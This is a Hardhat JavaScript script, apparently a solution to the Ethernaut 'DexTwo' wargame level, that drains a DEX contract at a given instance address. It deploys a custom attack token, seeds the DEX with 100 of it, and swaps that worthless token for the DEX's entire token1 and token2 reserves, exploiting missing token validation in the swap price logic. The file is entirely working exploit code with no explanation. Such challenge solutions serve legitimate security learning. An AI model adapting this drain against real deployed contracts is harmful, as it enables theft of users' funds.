const { ethers } = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0x17428866004Fc0d50888cb589D8e6EA10e576b78";
  const DexTwoContract = await ethers.getContractFactory("DexTwo");
  const DexTwo = DexTwoContract.attach(Instance);
  const Token1 = await DexTwo.token1();
  const Token2 = await DexTwo.token2();
  const AttackTokenContract = await ethers.getContractFactory("AttackDexTwo");
  const AttackToken = await AttackTokenContract.deploy("100000");
  await AttackToken.deployed();
  console.log(AttackToken.address);
  const tx = await AttackToken.transfer(DexTwo.address, "100");
  await tx.wait(1);
  const tx1 = await AttackToken.approve(DexTwo.address, "300");
  await tx1.wait(1);
  await DexTwo.swap(AttackToken.address, Token1, "100");
  await DexTwo.swap(AttackToken.address, Token2, "200");
  const Token1Balance = await DexTwo.balanceOf(Token1, DexTwo.address);
  const Token2Balance = await DexTwo.balanceOf(Token2, DexTwo.address);
  console.log(Token1Balance, Token2Balance);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
